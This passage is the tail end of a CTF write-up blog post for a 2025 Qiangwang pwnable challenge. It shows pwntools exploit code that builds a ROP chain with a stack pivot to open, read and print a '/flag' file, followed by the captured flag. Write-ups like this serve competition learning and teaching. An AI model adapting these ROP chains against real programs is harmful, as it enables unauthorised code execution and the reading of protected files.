<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="n">payload3</span> <span class="o">=</span> <span class="nf">gen_auto</span><span class="p">(</span><span class="n">my_targets</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
<span class="n">path</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x157</span>

<span class="n">abc</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
    <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="nb">open</span><span class="p">,</span>
    <span class="n">pop_rdi</span><span class="p">,</span>      <span class="mi">3</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span>      <span class="n">stack</span><span class="p">,</span>
    <span class="n">pop_rdx_r12</span><span class="p">,</span>  <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">read</span><span class="p">,</span>

    <span class="n">pop_rdi</span><span class="p">,</span>      <span class="mi">1</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span>      <span class="n">stack</span><span class="p">,</span>
    <span class="n">pop_rdx_r12</span><span class="p">,</span>  <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">write</span>
<span class="p">)</span>
<span class="n">read_more</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">path</span><span class="o">+</span><span class="mh">0x78</span><span class="p">,</span>
    <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">read</span>
<span class="p">)</span>
<span class="n">payload4</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">/flag</span><span class="se">\x00</span><span class="sh">"</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_more</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">data-&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload4</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">abc</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">flag{6WTv7A0crLU5r8r2UneKtxI5eLkQxRE1}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/pwnable/">Pwnable</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/stack-pivot/" class="post-tag no-text-decoration" >stack pivot</a> <a href="/tags/rop/" class="post-tag no-text-decoration" >rop</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[Writeup]%202025%20Qiangwang%20Challenge%20on%20Cyber%20Mimic%20Defense%20-%20KayTii&url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fmimic-writeup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=[Writeup]%202025%20Qiangwang%20Challenge%20on%20Cyber%20Mimic%20Defense%20-%20KayTii&u=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fmimic-writeup%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fmimic-writeup%2F&text=[Writeup]%202025%20Qiangwang%20Challenge%20on%20Cyber%20Mimic%20Defense%20-%20KayTii" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/pwncollege-advent-writeup/">[Writeup] Advent of Pwn 2025(Pwn College)</a><li class="text-truncate lh-lg"> <a href="/posts/stack-pivot-technique/">[Blog] Stack Pivot - Overflow in libc function</a><li class="text-truncate lh-lg"> <a href="/posts/mimic-writeup/">[Writeup] 2025 Qiangwang Challenge on Cyber Mimic Defense</a><li class="text-truncate lh-lg"> <a href="/posts/pwn-study-notes/">📓 PWN STUDY NOTES</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/stack-pivot/">stack pivot</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/blockchain/">blockchain</a> <a class="post-tag btn btn-outline-primary" href="/tags/blog/">blog</a> <a class="post-tag btn btn-outline-primary" href="/tags/ebpf/">eBPF</a> <a class="post-tag btn btn-outline-primary" href="/tags/io-uring/">io_uring</a> <a class="post-tag btn btn-outline-primary" href="/tags/ms-dos/">MS-DOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/pypu-pci/">pypu-pci</a> <a class="post-tag btn btn-outline-primary" href="/tags/rop/">rop</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/pwncollege-advent-writeup/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1766188800" data-df="ll" > Dec 20, 2025 </time><h4 class="pt-0 my-2">[Writeup] Advent of Pwn 2025(Pwn College)</h4><div class="text-muted"><p>Writeup for Advent of Pwn 2025</p></div></div></a></article><article class="col"> <a href="/posts/stack-pivot-technique/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1765238400" data-df="ll" > Dec 9, 2025 </time><h4 class="pt-0 my-2">[Blog] Stack Pivot - Overflow in libc function</h4><div class="text-muted"><p>Stack pivot technique</p></div></div></a></article><article class="col"> <a href="/posts/pwn-study-notes/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1742688000" data-df="ll" > Mar 23, 2025 </time><h4 class="pt-0 my-2">📓 PWN STUDY NOTES</h4><div class="text-muted"><p>PWN 101</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/pwn-study-notes/" class="btn btn-outline-primary" aria-label="Older" ><p>📓 PWN STUDY NOTES</p></a> <a href="/posts/stack-pivot-technique/" class="btn btn-outline-primary" aria-label="Newer" ><p>[Blog] Stack Pivot - Overflow in libc function</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/Kaytii210">Khoi Tran</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/stack-pivot/">stack pivot</a> <a class="post-tag btn btn-outline-primary" href="/tags/writeup/">writeup</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/blockchain/">blockchain</a> <a class="post-tag btn btn-outline-primary" href="/tags/blog/">blog</a> <a class="post-tag btn btn-outline-primary" href="/tags/ebpf/">eBPF</a> <a class="post-tag btn btn-outline-primary" href="/tags/io-uring/">io_uring</a> <a class="post-tag btn btn-outline-primary" href="/tags/ms-dos/">MS-DOS</a> <a class="post-tag btn btn-outline-primary" href="/tags/pypu-pci/">pypu-pci</a> <a class="post-tag btn btn-outline-primary" href="/tags/rop/">rop</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside><script> (function () { var btn = document.getElementById('back-to-top'); if (!btn) return; btn.addEventListener('click', function () { btn.classList.remove('slime-click'); void btn.offsetWidth; btn.classList.add('slime-click'); }); btn.addEventListener('animationend', function (e) { if (e.animationName === 'slime-click') { btn.classList.remove('slime-click'); } }); })(); </script></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
